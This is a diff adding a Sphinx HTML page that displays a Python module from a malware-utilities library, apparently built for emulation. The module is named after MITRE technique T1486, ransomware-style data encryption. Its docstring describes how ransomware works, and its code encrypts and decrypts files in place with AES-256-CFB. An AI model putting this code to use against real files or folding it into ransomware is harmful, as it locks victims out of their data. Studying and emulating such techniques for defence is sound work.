@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" >
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>mwutils.impact.data_encrypted_for_impact &mdash; mwutils 1.0 documentation</title>
+      <link rel="stylesheet" href="../../../_static/pygments.css" type="text/css" />
+      <link rel="stylesheet" href="../../../_static/css/theme.css" type="text/css" />
+  <!--[if lt IE 9]>
+    <script src="../../../_static/js/html5shiv.min.js"></script>
+  <![endif]-->
+  
+        <script data-url_root="../../../" id="documentation_options" src="../../../_static/documentation_options.js"></script>
+        <script src="../../../_static/jquery.js"></script>
+        <script src="../../../_static/underscore.js"></script>
+        <script src="../../../_static/_sphinx_javascript_frameworks_compat.js"></script>
+        <script src="../../../_static/doctools.js"></script>
+        <script src="../../../_static/sphinx_highlight.js"></script>
+        <script src="https://unpkg.com/mermaid@9.4.0/dist/mermaid.min.js"></script>
+        <script>mermaid.initialize({startOnLoad:true});</script>
+    <script src="../../../_static/js/theme.js"></script>
+    <link rel="index" title="Index" href="../../../genindex.html" />
+    <link rel="search" title="Search" href="../../../search.html" /> 
+</head>
+
+<body class="wy-body-for-nav"> 
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+
+          
+          
+          <a href="../../../index.html" class="icon icon-home">
+            mwutils
+          </a>
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../../../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <p class="caption" role="heading"><span class="caption-text">Contents:</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../../../README.html">About the Package</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../Documentation.html">Documentation</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../Logging.html">Logging</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../modules.html">mwutils</a></li>
+</ul>
+
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../../../index.html">mwutils</a>
+      </nav>
+
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          <div role="navigation" aria-label="Page navigation">
+  <ul class="wy-breadcrumbs">
+      <li><a href="../../../index.html" class="icon icon-home" aria-label="Home"></a></li>
+          <li class="breadcrumb-item"><a href="../../index.html">Module code</a></li>
+      <li class="breadcrumb-item active">mwutils.impact.data_encrypted_for_impact</li>
+      <li class="wy-breadcrumbs-aside">
+      </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+             
+  <h1>Source code for mwutils.impact.data_encrypted_for_impact</h1><div class="highlight"><pre>
+<span></span><span class="sd">&quot;&quot;&quot;Data Encrypted for Impact</span>
+
+<span class="sd">Adversaries may encrypt data on target systems or on large numbers of systems in a network to </span>
+<span class="sd">interrupt availability to system and network resources. </span>
+<span class="sd">They can attempt to render stored data inaccessible by encrypting files or data on local and </span>
+<span class="sd">remote drives and withholding access to a decryption key. </span>
+<span class="sd">This may be done in order to extract monetary compensation from a victim in exchange for </span>
+<span class="sd">decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases </span>
+<span class="sd">where the key is not saved or transmitted.</span>
+
+<span class="sd">In the case of ransomware, it is typical that common user files like Office documents, PDFs, </span>
+<span class="sd">images, videos, audio, text, and source code files will be encrypted </span>
+<span class="sd">(and often renamed and/or tagged with specific file markers). </span>
+<span class="sd">Adversaries may need to first employ other behaviors, such as File and Directory Permissions </span>
+<span class="sd">Modification or System Shutdown/Reboot, in order to unlock and/or gain access to manipulate </span>
+<span class="sd">these files. </span>
+<span class="sd">In some cases, adversaries may encrypt critical system files, disk partitions, and the MBR.</span>
+
+<span class="sd">To maximize impact on the target organization, malware designed for encrypting data may have </span>
+<span class="sd">worm-like features to propagate across a network by leveraging other attack techniques like </span>
+<span class="sd">Valid Accounts, OS Credential Dumping, and SMB/Windows Admin Shares. </span>
+<span class="sd">Encryption malware may also leverage Internal Defacement, such as changing victim wallpapers, </span>
+<span class="sd">or otherwise intimidate victims by sending ransom notes or other messages to connected printers </span>
+<span class="sd">(known as &quot;print bombing&quot;).</span>
+
+<span class="sd">In cloud environments, storage objects within compromised accounts may also be encrypted.</span>
+
+<span class="sd">Mitre: `T1486 &lt;https://attack.mitre.org/techniques/T1486/&gt;`_</span>
+
+<span class="sd">&quot;&quot;&quot;</span>
+<span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
+<span class="kn">from</span> <span class="nn">Crypto.Random</span> <span class="kn">import</span> <span class="n">get_random_bytes</span>
+
+
+<div class="viewcode-block" id="key_gen"><a class="viewcode-back" href="../../../mwutils.impact.data_encrypted_for_impact.html#mwutils.impact.data_encrypted_for_impact.key_gen">[docs]</a><span class="k">def</span> <span class="nf">key_gen</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;Generate a 32 random bytes.</span>
+
+<span class="sd">    Returns:</span>
+<span class="sd">        32 random bytes.</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="k">return</span> <span class="n">get_random_bytes</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span></div>
+
+
+<div class="viewcode-block" id="aes_encrypt"><a class="viewcode-back" href="../../../mwutils.impact.data_encrypted_for_impact.html#mwutils.impact.data_encrypted_for_impact.aes_encrypt">[docs]</a><span class="k">def</span> <span class="nf">aes_encrypt</span><span class="p">(</span><span class="n">path_file</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">key</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">buffer_size_bytes</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mi">1</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;Inplace AES 256 encryption using CFB Mode.</span>
+
+<span class="sd">    Encrypts the file using the given key.</span>
+<span class="sd">    A Initial Vector (16 bytes) used for encryption of the file is appended.</span>
+<span class="sd">    Encrypted file structure: &lt;file content&gt;&lt;initial vector [16 bytes]&gt;</span>
+
+<span class="sd">    Args:</span>
+<span class="sd">        path_file (str): Path to file.</span>
+<span class="sd">        key (bytes): The key used for encryption.</span>
+<span class="sd">        buffer_size_bytes (int, optional): Number of bytes read and encrypted at once.</span>
+<span class="sd">        Defaults to 1.</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="n">initial_vector</span> <span class="o">=</span> <span class="n">get_random_bytes</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
+    <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span>
+        <span class="n">key</span><span class="o">=</span><span class="n">key</span><span class="p">,</span>
+        <span class="n">mode</span><span class="o">=</span><span class="n">AES</span><span class="o">.</span><span class="n">MODE_CFB</span><span class="p">,</span>
+        <span class="n">iv</span><span class="o">=</span><span class="n">initial_vector</span><span class="p">,</span>
+        <span class="n">segment_size</span><span class="o">=</span><span class="n">buffer_size_bytes</span> <span class="o">*</span> <span class="mi">8</span><span class="p">,</span>
+    <span class="p">)</span>
+
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">path_file</span><span class="p">,</span> <span class="s2">&quot;rb+&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">file</span><span class="p">:</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">buffer_size_bytes</span><span class="p">)</span>  <span class="c1"># read first block</span>
+        <span class="k">while</span> <span class="n">data</span><span class="p">:</span>
+            <span class="n">file</span><span class="o">.</span><span class="n">seek</span><span class="p">(</span>
+                <span class="o">-</span><span class="n">buffer_size_bytes</span><span class="p">,</span> <span class="mi">1</span>
+            <span class="p">)</span>  <span class="c1"># seek back relative from current pointer position</span>
+            <span class="n">file</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">cipher</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>  <span class="c1"># write encrypted data</span>
+            <span class="n">data</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">buffer_size_bytes</span><span class="p">)</span>  <span class="c1"># read next block</span>
+        <span class="n">file</span><span class="o">.</span><span class="n">seek</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>  <span class="c1"># go to the end and write iv</span>
+        <span class="n">file</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">initial_vector</span><span class="p">)</span></div>
+
+
+<div class="viewcode-block" id="aes_decrypt"><a class="viewcode-back" href="../../../mwutils.impact.data_encrypted_for_impact.html#mwutils.impact.data_encrypted_for_impact.aes_decrypt">[docs]</a><span class="k">def</span> <span class="nf">aes_decrypt</span><span class="p">(</span><span class="n">path_file</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">key</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">buffer_size_bytes</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mi">1</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;Inplace AES 256 decryption using CFB Mode.</span>
+
+<span class="sd">    Decrypts the file and removes the appended Initial Vector from end of the file.</span>
+
+<span class="sd">    Args:</span>
+<span class="sd">        path_file (str): Path to file.</span>
+<span class="sd">        key (bytes): The key used for decryption.</span>
+<span class="sd">        buffer_size_bytes (int, optional): Number of bytes read and decryption at once.</span>
+<span class="sd">        Defaults to 1.</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="c1"># Note: Be aware of the potential loss of the iv</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">path_file</span><span class="p">,</span> <span class="s2">&quot;rb+&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">file</span><span class="p">:</span>
+        <span class="n">file</span><span class="o">.</span><span class="n">seek</span><span class="p">(</span><span class="o">-</span><span class="mi">16</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>  <span class="c1"># read iv from file</span>
+        <span class="n">iv_pos</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="n">tell</span><span class="p">()</span>
+        <span class="n">initial_vector</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
+        <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span>
+            <span class="n">key</span><span class="o">=</span><span class="n">key</span><span class="p">,</span>
+            <span class="n">mode</span><span class="o">=</span><span class="n">AES</span><span class="o">.</span><span class="n">MODE_CFB</span><span class="p">,</span>
+            <span class="n">iv</span><span class="o">=</span><span class="n">initial_vector</span><span class="p">,</span>
+            <span class="n">segment_size</span><span class="o">=</span><span class="n">buffer_size_bytes</span> <span class="o">*</span> <span class="mi">8</span><span class="p">,</span>
+        <span class="p">)</span>
+
+        <span class="n">file</span><span class="o">.</span><span class="n">seek</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>  <span class="c1"># go to beginning of file</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">buffer_size_bytes</span><span class="p">)</span>  <span class="c1"># read first block</span>
+        <span class="k">while</span> <span class="n">data</span><span class="p">:</span>
+            <span class="k">if</span> <span class="n">file</span><span class="o">.</span><span class="n">tell</span><span class="p">()</span> <span class="o">&gt;=</span> <span class="n">iv_pos</span><span class="p">:</span>
+                <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">removesuffix</span><span class="p">(</span>
+                    <span class="n">initial_vector</span><span class="p">[:</span> <span class="n">file</span><span class="o">.</span><span class="n">tell</span><span class="p">()</span> <span class="o">-</span> <span class="n">iv_pos</span><span class="p">]</span>
+                <span class="p">)</span>  <span class="c1"># remove iv from file</span>
+                <span class="n">dec_data</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">file</span><span class="o">.</span><span class="n">tell</span><span class="p">()</span><span class="si">}</span><span class="s2">&gt;</span><span class="si">{</span><span class="n">dec_data</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+                <span class="n">file</span><span class="o">.</span><span class="n">seek</span><span class="p">(</span>
+                    <span class="o">-</span><span class="n">buffer_size_bytes</span><span class="p">,</span> <span class="mi">1</span>
+                <span class="p">)</span>  <span class="c1"># seek back relative from current pointer position</span>
+                <span class="n">file</span><span class="o">.</span><span class="n">truncate</span><span class="p">()</span>  <span class="c1"># truncate file to current pointer position</span>
+                <span class="n">file</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">dec_data</span><span class="p">)</span>  <span class="c1"># write decrypted data</span>
+                <span class="k">return</span>
+            <span class="n">dec_data</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+            <span class="n">file</span><span class="o">.</span><span class="n">seek</span><span class="p">(</span>
+                <span class="o">-</span><span class="n">buffer_size_bytes</span><span class="p">,</span> <span class="mi">1</span>
+            <span class="p">)</span>  <span class="c1"># seek back relative from current pointer position</span>
+            <span class="n">file</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">dec_data</span><span class="p">)</span>  <span class="c1"># write decrypted data</span>
+            <span class="n">data</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">buffer_size_bytes</span><span class="p">)</span>  <span class="c1"># read next block</span></div>
+</pre></div>
+
+           </div>
+          </div>
+          <footer>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>&#169; Copyright 2023, wenzelfe.</p>
+  </div>
+
+  Built with <a href="https://www.sphinx-doc.org/">Sphinx</a> using a
+    <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a>
+    provided by <a href="https://readthedocs.org">Read the Docs</a>.
+   
+
+</footer>
+        </div>
+      </div>
+    </section>
+  </div>
+  <script>
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script> 
+
+</body>
+</html>
